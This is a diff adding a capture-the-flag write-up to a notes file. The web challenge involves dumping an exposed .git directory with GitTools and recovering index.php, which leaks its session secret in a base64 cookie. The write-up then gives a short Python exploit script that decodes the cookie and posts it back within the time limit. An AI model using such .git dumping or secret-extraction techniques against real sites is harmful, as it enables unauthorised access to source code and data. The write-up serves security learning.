@@ -1143,3 +1143,372 @@ To
 bye bye 
 
 ----
+
+# Sonic go brrr
+
+
+
+Challenge Information
+
+- **Category:** Web Security
+    
+- **Level:** medium
+    
+- **Points:** 50
+
+
+**description**
+
+Can you beat sonic?
+
+**Solution**
+
+after access the lab u see Apache web server page so i review source code and i found no thing so after see Robots.txt file i found hint tell me to use git soo i realized we'll use [GitTools](https://github.com/internetwache/GitTools) so i used dumber to see git status and what's happen (i mean commits) well , after use dumber i restore file named "index.php" (with this command "`git restore index.php`")
+and after see it i make script to get the flag but first I'll explain the code 
+
+![[Pasted image 20250507140541.png]]
+
+then type "git status " 
+
+![[Pasted image 20250507140617.png]]
+
+now type " git restore index.php" to restore this file 
+
+![[Pasted image 20250507140700.png]]
+
+and this is the index.php file 
+
+```php
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>CodePen - CSS+SVG Motion Blur Text Effect</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<svg xmlns="http://www.w3.org/2000/svg">
+
+  <!-- filterUnits is required to prevent clipping the blur outside the viewBox -->
+
+    <filter id="motion-blur-filter" filterUnits="userSpaceOnUse">
+
+      <!-- We only want horizontal blurring. x: 100, y: 0 -->
+
+        <feGaussianBlur stdDeviation="100 0"></feGaussianBlur>
+    </filter>
+</svg>
+
+
+<?php
+Session_start();
+
+function mstime(){
+
+  return round(microtime(true) * 1000);
+}
+
+function generateRandomString($length = 10) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+
+if(!isset($_SESSION['flooog']) and !isset($_COOKIE['secret'])) {
+    $flog=generateRandomString();
+    $_SESSION['flooog'] = $flog;
+    $_SESSION['counter'] = mstime();
+    setcookie("secret",base64_encode($flog));
+
+
+
+}
+
+if (isset($_POST['Q'])) {
+  if ($_POST['Q']== $_SESSION['flooog']) {
+
+    if (  (mstime() - $_SESSION['counter']) < 2999  ){
+
+    echo '<span filter-content="S">You won against sonic!!! GJ Here is a flag for you: flag{f4k3_fl4g}</span>';
+
+    }else{
+
+ echo '<span filter-content="S">cmon.. do you call this speed?</span>';
+
+    }
+
+  }else{
+
+ echo '<span filter-content="S">The encoded secret you provided is wrong :( Sonic is not impressed</span>';
+
+    echo "\n";
+  }
+
+}else{
+
+ echo "\n";
+ echo '<span filter-content="S">Q parameter is not set!</span>';
+  echo '<span filter-content="S">Challenge suspended</span>';
+}
+?>
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.12/vue.min.js'></script>
+</body>
+</html>
+```
+
+
+Sure! Let's go step by step to explain the code you provided, and then I'll also explain the script I created in detail.
+
+### **Explanation of the PHP code**:
+
+#### HTML Part:
+
+This part defines a simple HTML structure with an SVG graphic for a blur effect (it’s part of the page's design, not directly related to the challenge).
+
+```html
+<svg xmlns="http://www.w3.org/2000/svg">
+    <filter id="motion-blur-filter" filterUnits="userSpaceOnUse">
+        <feGaussianBlur stdDeviation="100 0"></feGaussianBlur>
+    </filter>
+</svg>
+```
+
+- This SVG defines a **motion blur effect** using the `feGaussianBlur` filter. It’s just part of the page's visual style.
+
+
+---
+
+#### PHP Part:
+
+Let’s dive into the PHP part where the logic for the challenge is implemented:
+
+1. **Session Initialization**:
+
+```php
+Session_start();
+```
+
+- This starts a PHP session to store and retrieve session variables like `$_SESSION['flooog']` and `$_SESSION['counter']`.
+    
+
+2. **Helper Functions**:
+
+```php
+function mstime() {
+    return round(microtime(true) * 1000);
+}
+```
+
+- `mstime()` returns the current time in milliseconds by using `microtime(true)` and multiplying it by 1000.
+
+```php
+function generateRandomString($length = 10) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+```
+
+- `generateRandomString()` generates a random string of a given length (default length is 10). It uses a set of characters (digits, lowercase, and uppercase) to form the random string.
+
+---
+
+3. **Session and Cookie Handling**:
+    
+
+```php
+if (!isset($_SESSION['flooog']) and !isset($_COOKIE['secret'])) {
+    $flog = generateRandomString();
+    $_SESSION['flooog'] = $flog;
+    $_SESSION['counter'] = mstime();
+    setcookie("secret", base64_encode($flog));
+}
+```
+
+- If the session variable `$_SESSION['flooog']` or the cookie `$_COOKIE['secret']` do not exist:
+    
+    - It generates a random string (`$flog`) and stores it in the session (`$_SESSION['flooog']`).
+        
+    - It also records the current timestamp (`$_SESSION['counter']`) in milliseconds.
+        
+    - It sets a cookie (`secret`) with the base64-encoded value of `$flog`.
+        
+
+This means the session is now initialized, and the secret (`flooog`) is saved both in the session and in the cookie.
+
+---
+
+4. **Processing the User's Input**:
+
+```php
+if (isset($_POST['Q'])) {
+    if ($_POST['Q'] == $_SESSION['flooog']) {
+        if ((mstime() - $_SESSION['counter']) < 2999) {
+            echo '<span filter-content="S">You won against sonic!!! GJ Here is a flag for you: flag{f4k3_fl4g}</span>';
+        } else {
+            echo '<span filter-content="S">cmon.. do you call this speed?</span>';
+        }
+    } else {
+        echo '<span filter-content="S">The encoded secret you provided is wrong :( Sonic is not impressed</span>';
+    }
+} else {
+    echo '<span filter-content="S">Q parameter is not set!</span>';
+    echo '<span filter-content="S">Challenge suspended</span>';
+}
+```
+
+- **If the `Q` parameter is set** in a POST request:
+    
+    - The script checks if the value of `Q` matches `$_SESSION['flooog']`.
+        
+    - If it matches:
+        
+        - It checks if the time difference between the current time and the session's timestamp is **less than 3 seconds** (3000 ms).
+            
+        - If the time condition is met, it prints a success message with a flag (`flag{f4k3_fl4g}`).
+            
+        - If the time condition is not met, it prints a message saying the speed is too slow.
+            
+    - If the `Q` value doesn’t match the session's `flooog`, it prints an error message.
+        
+- **If the `Q` parameter is not set** in the POST request, it prints that the challenge is suspended and the `Q` parameter is missing.
+
+---
+
+### **Explaining the Python Script**:
+
+Now, let’s break down the Python script I wrote to exploit the challenge:
+
+1. **Create a Session**:
+
+```python
+s = requests.Session()
+```
+
+- This initializes a session object using the `requests` library. This object will keep track of cookies (such as the `PHPSESSID` cookie), so you can reuse them for multiple requests.
+
+2. **Send a GET Request to Capture Cookies**:
+
+```python
+r = s.get(url)
+```
+
+- A GET request is sent to the target URL to start a session and receive cookies from the server. The `secret` cookie (which contains the base64-encoded `flooog` value) will be set by the server during this initial request.
+
+3. **Extract the Secret Cookie**:
+
+```python
+secret_cookie = r.cookies['secret']
+```
+
+- We extract the `secret` cookie from the response. This cookie holds the base64-encoded session value (`flooog`).
+
+4. **Decode the Cookie**:
+
+```python
+decoded_cookie = urllib.parse.unquote(secret_cookie)
+flooog = base64.b64decode(decoded_cookie).decode()
+```
+
+- The `secret_cookie` is URL-encoded, so we use `urllib.parse.unquote()` to decode it first.
+
+- Then, we decode the base64-encoded value using `base64.b64decode()` to retrieve the actual `flooog` value (the secret).
+
+5. **Make a POST Request with the Correct `Q` Parameter**:
+
+```python
+data = {'Q': flooog}
+r2 = s.post(url, data=data)
+```
+
+- Now that we have the correct `flooog` value, we send it as the `Q` parameter in a POST request to the server. This will allow us to interact with the server and check if the flag is returned.
+
+6. **Check the Response**:
+
+```python
+print("[+] Response Status Code:", r2.status_code)
+print("[+] Response Text:\n", r2.text)
+```
+
+- The response from the server is checked, and the status code and text are printed. If everything works correctly, the response will contain the flag.
+
+And after u run  script i already explain it in above 
+
+```python 
+import requests
+
+import base64
+
+import urllib.parse 
+  
+
+url = "http://ur-lab-link/index.php" # use must edit this value to ue lab's link
+  
+
+s = requests.Session()
+
+  
+
+r = s.get(url)
+
+  
+
+if "secret" not in r.cookies:
+
+    print("[-] Failed to get secret cookie!")
+
+    exit()
+
+  
+
+secret_cookie = r.cookies["secret"]
+
+print("[+] Got secret cookie (raw):", secret_cookie)
+
+  
+
+# Step 2: URL decode first
+
+decoded_cookie = urllib.parse.unquote(secret_cookie)
+
+print("[+] URL-decoded cookie:", decoded_cookie)
+
+  
+
+# Step 3: Base64 decode
+
+flooog = base64.b64decode(decoded_cookie).decode()
+
+print("[+] Decoded flooog value:", flooog)
+
+  
+
+# Step 4: POST with Q
+
+data = {"Q": flooog}
+
+r2 = s.post(url, data=data)
+
+  
+
+print("[+] Response Status Code:", r2.status_code)
+
+print("[+] Response Text:\n", r2.text)
+```
+
+Well, after u run the script u got output like this and  it's contain the flag :
+
+![[Pasted image 20250507141615.png]]
+
+---
